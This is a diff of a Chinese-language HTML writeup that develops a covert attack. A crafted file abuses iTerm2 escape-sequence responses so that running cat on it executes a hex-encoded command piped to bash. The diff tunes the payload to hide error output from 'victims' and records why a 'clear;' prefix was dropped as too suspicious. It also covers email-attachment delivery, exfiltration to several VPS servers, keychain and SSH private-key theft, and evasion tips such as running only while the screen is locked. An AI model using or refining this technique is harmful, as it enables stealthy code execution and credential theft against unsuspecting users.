@@ -1134,7 +1134,7 @@ EBADF                                      14      14
 <td>终端两行报错</td>
 <td><strong>高</strong></td>
 <td><code>$'\E_Gi=1': command not found</code> + <code>EBADF:The: command not found</code></td>
-<td><code>clear;</code> 前置</td>
+<td>无法消除（源头固定），<code>clear;</code> 方案已撤销（反而多错）</td>
 </tr>
 <tr>
 <td><strong>V2</strong></td>
@@ -1195,12 +1195,45 @@ z&quot;: command not found                ← Line 3
       Line 3 = #&quot; couldn't be opened...     ← # 开头，注释，忽略
 </code></pre>
 <p><strong>实测：报错 3 行 → 2 行，exit code 127 → 0。</strong></p>
-<p><strong>修复 2 — 命令前加 <code>clear;</code></strong></p>
-<pre><code>Line 2 = clear; echo &lt;hex&gt;|xxd -r -p|bash
-</code></pre>
-<p><code>clear</code> 输出 <code>\033[H\033[2J\033[3J</code>，在真实终端会清空屏幕 + 回滚缓冲。</p>
-<p><strong>实测 stdout：<code>'\x1b[H\x1b[2J\x1b[3J&lt;output&gt;'</code> —— 清屏序列确实在输出之前。</strong></p>
-<p><strong>最终效果：受害者 cat 后屏幕被清空，只剩干净的提示符。</strong></p>
+<p><strong>修复 2 — 曾尝试 <code>clear;</code> 前置，已撤销</strong></p>
+<p>早期版本在命令前加 <code>clear;</code>，想清掉 Line 1 的报错。<strong>Docker 实测后撤销了。</strong></p>
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>file_path</th>
+<th>有 <code>$TERM</code></th>
+<th>无 <code>$TERM</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A（原 PoC）</td>
+<td><code>/tmp/x</code> + LF + <code>{CMD}</code> + LF + <code>z</code></td>
+<td>3 行报错</td>
+<td>3 行报错</td>
+</tr>
+<tr>
+<td>B（<code>clear;</code> + <code>#</code>）</td>
+<td><code>/tmp/x</code> + LF + <code>clear; {CMD}</code> + LF + <code>#</code></td>
+<td>2 行 + <strong>清屏</strong></td>
+<td><strong>3 行</strong></td>
+</tr>
+<tr>
+<td><strong>C（只用 <code>#</code>，当前）</strong></td>
+<td><code>/tmp/x</code> + LF + <code>{CMD}</code> + LF + <code>#</code></td>
+<td><strong>2 行</strong></td>
+<td><strong>2 行</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>clear;</code> 的两个问题：</strong></p>
+<ol>
+<li><strong>依赖 <code>$TERM</code></strong> —— 未设置时 <code>clear</code> 失败，stderr 反而多一行 <code>TERM environment variable not set.</code></li>
+<li><strong>清屏本身可疑</strong> —— 用户 <code>cat</code> 完文件屏幕突然清空，比看到两行 <code>command not found</code> 更让人警觉</li>
+</ol>
+<p><strong><code>#</code> 结尾一个字符就达成了 <code>clear;</code> 加 <code>#</code> 两个改动的全部效果（消除 Line 3 报错），且无副作用。</strong></p>
+<p><strong>最终：<code>prepend_clear</code> 保留为可选参数，默认 <code>False</code>。实测 APC 从 351 字节降到 339 字节。</strong></p>
 <p><strong>V5：钥匙串弹窗</strong></p>
 <p>原始每次调用都要求输入登录密码，<strong>这是最严重的暴露</strong>。</p>
 <p><strong>修复：只复制文件 + 2 秒超时</strong></p>
@@ -1475,8 +1508,8 @@ SSH 私钥：               85%
 </tr>
 <tr>
 <td>消除 Line 1 报错</td>
-<td>命令前加 <code>clear;</code></td>
-<td>✓ 实测验证</td>
+<td>~~<code>clear;</code> 前置~~ → <strong>已撤销</strong>（无 TERM 时反增报错，清屏可疑）</td>
+<td>✗ 放弃</td>
 </tr>
 <tr>
 <td>去掉屏幕截图</td>
@@ -1643,7 +1676,7 @@ README: 2292 字节
 <p><strong>优势</strong>：<br />
 - 任何一个 VPS 可达就成功<br />
 - 多个 VPS 同时收数据 → 冗余备份<br />
-- 每个 APC 的 <code>clear</code> 会清掉前面的报错，屏幕始终干净</p>
+- 每个 APC 的 <code>#</code> 结尾会消除 Line 3 报错（Line 1 的两行保留）</p>
 <h3 id="85">8.5 一个反直觉的发现</h3>
 <p><strong>Line 1 的报错无法消除。</strong></p>
 <p>file_path 不能以 <code>#</code> 开头，因为那会让 Line 1 变成：</p>
@@ -1651,7 +1684,7 @@ README: 2292 字节
 </code></pre>
 <p><code>#</code> 前面有 <code>\x1b_Gi=1;EBADF:The file "</code>，这部分仍然被当命令执行。</p>
 <p><strong>根本原因：iTerm2 的响应格式是固定的（<code>EBADF:&lt;error&gt;</code>），前缀不受攻击者控制。</strong></p>
-<p><strong>所以 Line 1 的报错只能靠 <code>clear</code> 覆盖，不能从源头消除。</strong></p>
+<p><strong>所以 Line 1 的报错无法从源头消除。<code>clear;</code> 覆盖方案实测有副作用（无 TERM 时反增报错、清屏可疑），已撤销。</strong></p>
 <hr />
 <h2 id="_12">九、邮件附件投递</h2>
 <p>针对邮件场景单独优化的一套生成器：<code>email-delivery.py</code></p>
@@ -1899,7 +1932,7 @@ python email-delivery.py   --multi &quot;1.2.3.4:8080,5.6.7.8:8081,9.10.11.12:90
 </tbody>
 </table>
 <p><strong>唯一明显的迹象</strong>：终端会闪两行 <code>command not found</code>。如果受害者注意，会发现异常。</p>
-<p><strong>缓解</strong>：在 payload 前面加 <code>clear</code>，或者用 <code>echo</code> 覆盖。</p>
+<p><strong>缓解</strong>：<code>#</code> 结尾消除 Line 3；Line 1 的两行无法消除（<code>clear;</code> 方案实测更差）。</p>
 <h3 id="82">8.2 系统日志</h3>
 <pre><code>· macOS 不记录 shell 命令历史（除非开了 auditd）
 · 网络连接：不影响
@@ -1911,7 +1944,7 @@ python email-delivery.py   --multi &quot;1.2.3.4:8080,5.6.7.8:8081,9.10.11.12:90
 <pre><code>· 检查屏幕锁定状态，锁定时执行
 · 钥匙串 dump 放在最后，如果前面已经拿到足够数据就跳过
 · 用 nohup 后台执行，避免阻塞终端
-· 执行后 clear 屏幕
+· 执行后不留 Line 3 报错（`#` 结尾）
 </code></pre>
 <hr />
 <h2 id="_14">十一、局限</h2>
